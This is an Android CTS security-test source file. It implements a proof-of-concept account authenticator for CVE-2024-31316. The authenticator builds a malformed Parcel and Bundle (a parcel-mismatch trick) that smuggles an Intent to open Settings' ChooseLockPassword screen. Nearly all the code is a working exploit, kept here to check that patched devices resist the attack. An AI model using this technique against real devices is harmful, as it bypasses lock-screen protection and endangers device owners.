/*
 * Copyright (C) 2024 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package android.security.cts.CVE_2024_31316;

import static android.accounts.AccountManager.KEY_AUTHTOKEN;

import android.accounts.AbstractAccountAuthenticator;
import android.accounts.Account;
import android.accounts.AccountAuthenticatorResponse;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.BaseBundle;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;

import java.lang.reflect.Field;
import java.util.Random;

public class PocService extends Service {

    private final String mStringInputForParcel = "cve_2024_31316_string";

    @Override
    public IBinder onBind(Intent intent) {
        return new PocAuthenticator(this).getIBinder();
    }

    private class PocAuthenticator extends AbstractAccountAuthenticator {

        public PocAuthenticator(Context context) {
            super(context);
        }

        @Override
        public Bundle editProperties(AccountAuthenticatorResponse response, String accountType) {
            return null;
        }

        @Override
        public Bundle addAccount(
                AccountAuthenticatorResponse response,
                String accountType,
                String authTokenType,
                String[] requiredFeatures,
                Bundle options) {
            try {
                // Set the parcel size initially to zero which later gets updated.
                final Parcel parcel = Parcel.obtain();
                parcel.writeInt(0 /* Set initial size of parcel to zero */);

                // Append 'BUNDLE_MAGIC' to bypass a check whether the bundle is a JavaBundle
                int bundleMagic = -1;
                for (Field field : BaseBundle.class.getDeclaredFields()) {
                    if (field.getName().equals("BUNDLE_MAGIC")) {
                        field.setAccessible(true);
                        bundleMagic = (int) field.get(null);
                    }
                }
                if (bundleMagic == -1) {
                    // https://cs.android.com/android/platform/superproject/main/+/main:frameworks/base/core/java/android/os/BaseBundle.java?q=BUNDLE_MAGIC
                    bundleMagic = 1279544898; // 'B' 'N' 'D' 'L'
                }
                parcel.writeInt(bundleMagic);

                // Set size of map in following order
                // Mismatch Parcelable - authtoken - fakeIntent - holder key
                parcel.writeInt(4 /* Map size of 4 */);

                // Fill map with a mismatched parcelable
                // {key='cve_2024_31316_string', value=InputMethodInfo{id,
                // settings:settingsActivityName}
                parcel.writeString(mStringInputForParcel /* Key */);
                parcel.writeInt(4 /* Type */);
                createAMismatchParcelAndAppendToParcel(parcel);

                // Set 'authToken' {key='authtoken', value=null)
                parcel.writeString(KEY_AUTHTOKEN /* Key */);
                parcel.writeInt(0 /* Type */);
                parcel.writeInt(-1 /* Size < 0, sets value as null */);

                // Set 'fakeIntent' including the intent to launch 'ChooseLockPassword'
                // {key=<includes intent to launch 'ChooseLockPassword'>, value=null}
                final int keyStart = parcel.dataPosition();
                final Parcel intentAsMapKey = getIntentAsKey();
                parcel.appendFrom(intentAsMapKey, 0, intentAsMapKey.dataSize());
                intentAsMapKey.recycle();
                parcel.setDataPosition(keyStart);
                final String intentKeyStr = parcel.readString();
                parcel.writeInt(0 /* Type */);
                parcel.writeInt(-1 /* Size < 0, sets value as null */);

                // Set 'holderKey' {key=<randomString>, value=null}
                String holderKey = randomStringByJavaRandom();
                while (holderKey.hashCode() <= intentKeyStr.hashCode()) {
                    holderKey = randomStringByJavaRandom();
                }
                parcel.writeString(holderKey);
                parcel.writeInt(-1 /* Set value as null */);
                final int totalSize = parcel.dataSize(); // Fetch the dataSize of the parcel
                parcel.setDataPosition(0);
                parcel.writeInt(totalSize - 8 /* Update the size to 'totalSize - 8' */);
                parcel.setDataPosition(0);

                // Create a bundle using the created parcel and return
                final Bundle maliciousBundle = new Bundle();
                maliciousBundle.readFromParcel(parcel);
                return maliciousBundle;
            } catch (Exception ignore) {
                // Ignore
            }
            return null;
        }

        private void createAMismatchParcelAndAppendToParcel(Parcel parcel) {
            // Append the instance of 'InputMethodInfo' to parcel
            parcel.writeString("android.view.inputmethod.InputMethodInfo" /* Key */);
            parcel.writeString("id" /* mId */);
            parcel.writeString("settingsActivityName" /* mSettingsActivityName */);
            parcel.writeInt(0 /* mIsDefaultResId */);
            parcel.writeInt(0 /* mIsAuxIme */);
            parcel.writeInt(0 /* mSupportsSwitchingToNextInputMethod */);
            parcel.writeInt(0 /* mInlineSuggestionsEnabled */);
            parcel.writeInt(0 /* mSuppressesSpellChecker */);
            parcel.writeInt(0 /* mShowInInputMethodPicker */);
            parcel.writeInt(0 /* mIsVrOnly */);

            // Set 'mService' field of 'InputMethodInfo'
            getPackageManager()
                    .resolveActivity(new Intent().setPackage(getPackageName()), 0)
                    .writeToParcel(parcel, 0);

            parcel.writeInt(-1 /* Set 'mCount' of 'InputMethodSubtypeArray' */);
            parcel.writeInt(1 /* mHandledConfigChanges */);
        }

        private Parcel getIntentAsKey() {
            // frameworks/native/libs/binder/Parcel.cpp
            // Parcel::readString16Inplace()
            final Parcel intentAsMapKey = Parcel.obtain();
            intentAsMapKey.writeInt(0);
            intentAsMapKey.writeInt(0);
            intentAsMapKey.writeInt(0);
            intentAsMapKey.writeInt(0);
            intentAsMapKey.writeInt(0);
            intentAsMapKey.writeInt(0);
            intentAsMapKey.writeString(mStringInputForParcel);

            // Write the target intent
            intentAsMapKey.writeString("intent");
            final Intent hackIntent = new Intent();
            hackIntent
                    .setClassName(
                            "com.android.settings",
                            "com.android.settings.password.ChooseLockPassword")
                    .putExtra(mStringInputForParcel /* Key */, "null" /* Value */);
            intentAsMapKey.writeValue(hackIntent /* Intent to launch 'ChooseLockPassword' */);

            // Create a bundle using the parcel with intent and return
            final Parcel outParcel = Parcel.obtain();
            outParcel.writeInt((intentAsMapKey.dataSize() - 2) / 2);
            outParcel.appendFrom(intentAsMapKey, 0, intentAsMapKey.dataSize());
            outParcel.setDataPosition(0);
            return outParcel;
        }

        private String randomStringByJavaRandom() {
            final StringBuilder stringBuilder = new StringBuilder();
            final Random random = new Random();
            for (int idx = 0; idx < 8; ++idx) {
                stringBuilder.append(random.nextInt(10));
            }
            return stringBuilder.toString();
        }

        @Override
        public Bundle confirmCredentials(
                AccountAuthenticatorResponse response, Account account, Bundle options) {
            return null;
        }

        @Override
        public Bundle getAuthToken(
                AccountAuthenticatorResponse response,
                Account account,
                String authTokenType,
                Bundle options) {
            return null;
        }

        @Override
        public String getAuthTokenLabel(String authTokenType) {
            return null;
        }

        @Override
        public Bundle updateCredentials(
                AccountAuthenticatorResponse response,
                Account account,
                String authTokenType,
                Bundle options) {
            return null;
        }

        @Override
        public Bundle hasFeatures(
                AccountAuthenticatorResponse response, Account account, String[] features) {
            return null;
        }
    }
}
